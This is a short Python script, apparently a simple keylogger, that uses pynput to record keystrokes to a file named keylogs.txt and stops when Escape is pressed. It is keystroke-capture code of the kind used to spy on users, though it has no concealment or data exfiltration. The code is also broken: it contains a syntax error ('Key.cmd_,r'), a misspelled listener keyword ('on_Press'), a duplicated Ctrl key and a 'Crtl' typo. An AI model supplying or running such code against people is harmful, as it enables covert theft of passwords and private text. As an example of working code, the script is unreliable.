from pynput.keyboard import Listener, Key

def write_to_file(key):

    key_data = str(key).replace("'", "")

    print(key_data)
    print('{0} release'.format(key))
    if key == Key.esc:
        print("entered escape")
        return False

    if key in (Key.shift, Key.shift_l, Key.shift_r,):
        key_data = ' Shift + '
    if key in (Key.ctrl, Key.ctrl, Key.ctrl_r,):
        key_data = ' Crtl + '
    if key in (Key.cmd, Key.cmd_l, Key.cmd_,r):
        key_data = ' Command + '
    if key in (Key.space,):
        key_data = ' '
    if key in (Key.enter,):
        key_data = '\n'
    try:
        with open("keylogs.txt", "a") as fout:
            fout.write(key_data)
    except FileNotFoundError:
        with open("keylogs.txt", "w") as fout:
            fout.write(key_data)


with Listener(on_Press=write_to_file) as listener:
    listener.join()